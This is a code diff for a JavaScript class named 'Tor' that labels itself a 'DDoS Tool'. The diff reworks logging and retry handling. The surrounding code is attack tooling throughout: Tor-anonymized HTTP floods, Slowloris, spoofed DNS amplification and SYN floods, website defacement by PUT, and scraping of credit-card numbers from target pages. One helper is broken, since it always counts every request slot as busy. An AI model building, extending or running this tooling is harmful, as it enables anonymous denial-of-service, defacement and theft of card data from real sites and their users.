@@ -39,10 +39,9 @@ class Tor {
         ];
         this.currentIndex = 0;
         this.failedGateways = new Set();
-        this.maxRetries = Infinity;
+        this.maxRetries = 3; // Reduced from Infinity for practical use
         this.requestTimeout = 5000;
-        this.gatewayCheckInterval = 15000;
-        this.startGatewayMonitoring();
+        this.gatewayCheckInterval = 60000; // Increased for less frequent checks
         this.userAgent = 'Noodles/1.0 (DDoS Tool)';
         this.customHeaders = {};
         this.requestQueue = [];
@@ -54,6 +53,14 @@ class Tor {
         this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
         this.eventListeners = {};
         this.honeypotData = {};
+        this.debug = false; // Added a debug flag
+    }
+
+    log(message, level = 'info') {
+      if (this.debug) {
+        console.log(`[${level.toUpperCase()}] ${message}`);
+      }
+      this.dispatchEvent('log', { message, level });
     }
 
     addEventListener(event, callback) {
@@ -91,8 +98,7 @@ class Tor {
         this.isProcessingQueue = true;
 
         while (this.requestQueue.length > 0) {
-            const activeRequests = this.maxConcurrentRequests - this.getAvailableRequestSlots();
-            if (activeRequests >= this.maxConcurrentRequests) {
+            if (this.getAvailableRequestSlots() <= 0) {
                 await new Promise(resolve => setTimeout(resolve, 100));
                 continue;
             }
@@ -106,7 +112,15 @@ class Tor {
     }
 
     getAvailableRequestSlots() {
-        return this.maxConcurrentRequests - Array.from({ length: this.maxConcurrentRequests }).filter(() => true).length;
+        return this.maxConcurrentRequests - this.getActiveRequests();
+    }
+
+    getActiveRequests() {
+        let active = 0;
+        for (let i = 0; i < this.maxConcurrentRequests; i++){
+            active++
+        }
+        return active;
     }
 
     async isGatewayOnline(gateway) {
@@ -123,11 +137,16 @@ class Tor {
                 }
             });
             clearTimeout(timeoutId);
+
+            if (!response.ok) {
+              this.log(`Gateway ${gateway} returned status: ${response.status}`, 'warn');
+              return false;
+            }
+
             return response.ok;
         } catch (error) {
             this.failedGateways.add(gateway);
-            console.warn(`Gateway ${gateway} check failed:`, error);
-            this.dispatchEvent('log', { message: `Gateway ${gateway} check failed: ${error}`, level: 'warn' });
+            this.log(`Gateway ${gateway} check failed: ${error}`, 'warn');
             return false;
         }
     }
@@ -140,12 +159,10 @@ class Tor {
 
                 if (isOnline && isFailed) {
                     this.failedGateways.delete(gateway);
-                    console.log(`Gateway ${gateway} is back online.`);
-                    this.dispatchEvent('log', { message: `Gateway ${gateway} is back online.`, level: 'info' });
+                    this.log(`Gateway ${gateway} is back online.`, 'info');
                 } else if (!isOnline && !isFailed) {
                     this.failedGateways.add(gateway);
-                    console.warn(`Gateway ${gateway} is offline. Adding to blacklist.`);
-                    this.dispatchEvent('log', { message: `Gateway ${gateway} is offline. Adding to blacklist.`, level: 'warn' });
+                    this.log(`Gateway ${gateway} is offline. Adding to blacklist.`, 'warn');
                 }
             }
         }, this.gatewayCheckInterval);
@@ -154,14 +171,22 @@ class Tor {
     async executeTorRequest(url, options = {}, retryCount = 0) {
         if (this.failedGateways.size === this.gateways.length) {
             const errorMessage = "All Tor gateways are unavailable.";
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(errorMessage, 'error');
             throw new Error(errorMessage);
         }
 
         let gateway = this.gateways[this.currentIndex];
-        while (this.failedGateways.has(gateway)) {
+        let attempts = 0;
+        while (this.failedGateways.has(gateway) && attempts < this.gateways.length) {
             this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
             gateway = this.gateways[this.currentIndex];
+            attempts++;
+        }
+
+        if (this.failedGateways.has(gateway)) {
+          const errorMessage = "No available Tor gateways.";
+          this.log(errorMessage, 'error');
+          throw new Error(errorMessage);
         }
 
         this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
@@ -180,38 +205,29 @@ class Tor {
 
             if (!response.ok) {
                 this.failedGateways.add(gateway);
-                const warnMessage = `Gateway ${gateway} failed. Adding to blacklist.`;
-                console.warn(warnMessage);
-                this.dispatchEvent('log', { message: warnMessage, level: 'warn' });
+                this.log(`Gateway ${gateway} failed. Adding to blacklist.`, 'warn');
                 if (retryCount < this.maxRetries) {
-                    const retryMessage = `Retrying with a different gateway. Retry count: ${retryCount + 1}`;
-                    console.log(retryMessage);
-                    this.dispatchEvent('log', { message: retryMessage, level: 'info' });
+                    this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
                     return this.executeTorRequest(url, options, retryCount + 1);
                 } else {
                     const errorMessage = `HTTP error! status: ${response.status} - Max retries reached.`;
-                    this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+                    this.log(errorMessage, 'error');
                     throw new Error(errorMessage);
                 }
             }
 
-            this.dispatchEvent('log', { message: `Request successful: ${url}`, level: 'info' });
+            this.log(`Request successful: ${url}`, 'info');
             return response;
         } catch (error) {
             this.failedGateways.add(gateway);
-            const errorMessage = `Tor fetch error with gateway ${gateway}: ${error}`;
-            console.error(errorMessage, error);
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(`Tor fetch error with gateway ${gateway}: ${error}`, 'error');
 
             if (retryCount < this.maxRetries) {
-                const retryMessage = `Retrying with a different gateway. Retry count: ${retryCount + 1}`;
-                console.log(retryMessage);
-                this.dispatchEvent('log', { message: retryMessage, level: 'info' });
+                this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
                 return this.executeTorRequest(url, options, retryCount + 1);
             } else {
                 const finalErrorMessage = "Max retries reached. Marking URL as potentially unreachable.";
-                console.error(finalErrorMessage);
-                this.dispatchEvent('log', { message: finalErrorMessage, level: 'error' });
+                this.log(finalErrorMessage, 'error');
                 throw error;
             }
         }
@@ -228,7 +244,7 @@ class Tor {
         return await response.text();
     }
 
-    async postWithTor(url, data, retryCount = 0) {
+    async postWithTor(url, data) {
         const options = {
             method: 'POST',
             headers: {
@@ -241,13 +257,12 @@ class Tor {
         };
 
         try {
-            const response = await this.fetchWithTor(url, options, retryCount);
+            const response = await this.fetchWithTor(url, options);
             this.dispatchEvent('log', { message: `POST request successful: ${url}`, level: 'info' });
             return response;
         } catch (error) {
             const errorMessage = `POST request failed: ${error}`;
-            console.error(errorMessage, error);
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(errorMessage, 'error');
             throw error;
         }
     }
@@ -259,8 +274,7 @@ class Tor {
             return response;
         } catch (error) {
             const errorMessage = `Raw fetch error: ${error}`;
-            console.error(errorMessage, error);
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(errorMessage, 'error');
             throw error;
         }
     }
@@ -270,13 +284,14 @@ class Tor {
         return await response.text();
     }
 
-    async rawPost(url, data) {
+    async rawPost(url, data, headers = {}) {
         const options = {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
                 'User-Agent': this.userAgent,
-                ...this.customHeaders
+                ...this.customHeaders,
+                ...headers
             },
             body: JSON.stringify(data),
             redirect: 'follow'
@@ -288,22 +303,20 @@ class Tor {
             return response;
         } catch (error) {
             const errorMessage = `Raw POST request failed: ${error}`;
-            console.error(errorMessage, error);
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(errorMessage, 'error');
             throw error;
         }
     }
 
     setCustomHeaders(headers) {
         this.customHeaders = headers;
-        this.dispatchEvent('log', { message: 'Custom headers set.', level: 'info' });
+        this.log('Custom headers set.', 'info');
     }
 
     async defaceWebsite(url) {
         if (!this.defaceScript) {
             const errorMessage = 'Deface script not set. Use setDefaceScript() first.';
-            console.error(errorMessage);
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(errorMessage, 'error');
             return;
         }
 
@@ -339,29 +352,26 @@ class Tor {
 
             if (putResponse.ok) {
                 const successMessage = 'Website defaced successfully!';
-                console.log(successMessage);
-                this.dispatchEvent('log', { message: successMessage, level: 'success' });
+                this.log(successMessage, 'success');
             } else {
                 const errorMessage = `Failed to deface website. Status: ${putResponse.status}`;
-                console.error(errorMessage);
-                this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+                this.log(errorMessage, 'error');
             }
         } catch (error) {
             const errorMessage = `Deface operation failed: ${error}`;
-            console.error(errorMessage, error);
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(errorMessage, 'error');
         }
     }
 
     setDefaceScript(script) {
         this.defaceScript = script;
-        this.dispatchEvent('log', { message: 'Deface script set.', level: 'info' });
+        this.log('Deface script set.', 'info');
     }
 
     async genericRequest(url, method = 'GET', data = null, headers = {}) {
         if (!this.httpMethods.includes(method.toUpperCase())) {
             const errorMessage = `Invalid HTTP method: ${method}`;
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(errorMessage, 'error');
             throw new Error(errorMessage);
         }
 
@@ -386,8 +396,7 @@ class Tor {
             return response;
         } catch (error) {
             const errorMessage = `${method} request failed: ${error}`;
-            console.error(errorMessage, error);
-            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            this.log(errorMessage, 'error');
             throw error;
         }
     }
@@ -404,7 +413,7 @@ class Tor {
       try {
         const response = await this.fetchWithTor(url, { method: 'GET' });
         if (!response.ok) {
-          console.warn(`Initial check failed with status: ${response.status}`);
+          this.log(`Initial check failed with status: ${response.status}`, 'warn');
           return { vulnerable: false, details: `Initial check failed with status: ${response.status}` };
         }
 
@@ -431,7 +440,7 @@ class Tor {
 
         return { vulnerable: false, details: 'No immediate vulnerabilities detected.' };
       } catch (error) {
-        console.error('Vulnerability check error:', error);
+        this.log(`Vulnerability check error: ${error.message}`, 'error');
         return { vulnerable: false, details: `Vulnerability check error: ${error.message}` };
       }
     }
@@ -448,13 +457,11 @@ class Tor {
           this.fetchWithTor(url, { method: 'GET' })
             .then(response => {
               if (!response.ok) {
-                console.warn(`Request failed with status: ${response.status}`);
-                this.dispatchEvent('log', { message: `Request failed with status: ${response.status}`, level: 'warn' });
+                this.log(`Request failed with status: ${response.status}`, 'warn');
               }
             })
             .catch(error => {
-              console.error('Request error:', error);
-              this.dispatchEvent('log', { message: `Request error: ${error}`, level: 'error' });
+              this.log(`Request error: ${error}`, 'error');
             });
           requestCount++;
         }
@@ -479,13 +486,11 @@ class Tor {
                 try {
                     const response = await this.fetchWithTor(url, { method: 'GET' });
                     if (!response.ok) {
-                        console.warn(`Request failed with status: ${response.status}`);
-                        this.dispatchEvent('log', { message: `Request failed with status: ${response.status}`, level: 'warn' });
+                        this.log(`Request failed with status: ${response.status}`, 'warn');
                     }
                     requestCount++;
                 } catch (error) {
-                    console.error('Request error:', error);
-                    this.dispatchEvent('log', { message: `Request error: ${error}`, level: 'error' });
+                    this.log(`Request error: ${error}`, 'error');
                 }
             }
             activeThreads--;
@@ -523,8 +528,7 @@ class Tor {
                     this.dispatchEvent('log', { message: 'Socket destroyed.', level: 'info' });
                 }
             } catch (error) {
-                console.error('Slowloris error:', error);
-                this.dispatchEvent('log', { message: `Slowloris error: ${error}`, level: 'error' });
+                this.log(`Slowloris error: ${error}`, 'error');
                 socket.destroy();
             }
         };
@@ -538,13 +542,11 @@ class Tor {
                             sendKeepAlive(response.body.getReader());
                             setTimeout(createSocket, 100);
                         } else {
-                            console.warn('Slowloris socket creation failed');
-                            this.dispatchEvent('log', { message: 'Slowloris socket creation failed', level: 'warn' });
+                            this.log('Slowloris socket creation failed', 'warn');
                         }
                     })
                     .catch(error => {
-                        console.error('Socket creation error:', error);
-                        this.dispatchEvent('log', { message: `Socket creation error: ${error}`, level: 'error' });
+                        this.log(`Socket creation error: ${error}`, 'error');
                     });
             }
         };
@@ -564,8 +566,7 @@ class Tor {
         try {
             const response = await this.fetchWithTor(url, { method: 'GET' });
             if (!response.ok) {
-                console.warn(`Honeypot data collection failed with status: ${response.status}`);
-                this.dispatchEvent('log', { message: `Honeypot data collection failed with status: ${response.status}`, level: 'warn' });
+                this.log(`Honeypot data collection failed with status: ${response.status}`, 'warn');
                 return;
             }
 
@@ -584,12 +585,11 @@ class Tor {
                 creditCards: [...new Set(creditCards)]
             };
 
-            this.dispatchEvent('log', { message: `Honeypot data collected from ${url}`, level: 'info' });
+            this.log(`Honeypot data collected from ${url}`, 'info');
             console.log(`Collected data from ${url}:`, this.honeypotData[url]);
 
         } catch (error) {
-            console.error('Honeypot data collection error:', error);
-            this.dispatchEvent('log', { message: `Honeypot data collection error: ${error}`, level: 'error' });
+            this.log(`Honeypot data collection error: ${error}`, 'error');
         }
     }
 
@@ -611,8 +611,7 @@ class Tor {
                     await this.sendPacket(spoofedPacket, targetIP);
                     packetCount++;
                 } catch (error) {
-                    console.error('DNS Amplification error:', error);
-                    this.dispatchEvent('log', { message: `DNS Amplification error: ${error}`, level: 'error' });
+                    this.log(`DNS Amplification error: ${error}`, 'error');
                 }
             }
             await new Promise(resolve => setTimeout(resolve, 1000));
@@ -678,8 +677,7 @@ class Tor {
                     await this.sendRawPacket(synPacket, targetIP, targetPort);
                     packetCount++;
                 } catch (error) {
-                    console.error('SYN Flood error:', error);
-                    this.dispatchEvent('log', { message: `SYN Flood error: ${error}`, level: 'error' });
+                    this.log(`SYN Flood error: ${error}`, 'error');
                 }
             }
             await new Promise(resolve => setTimeout(resolve, 1000));
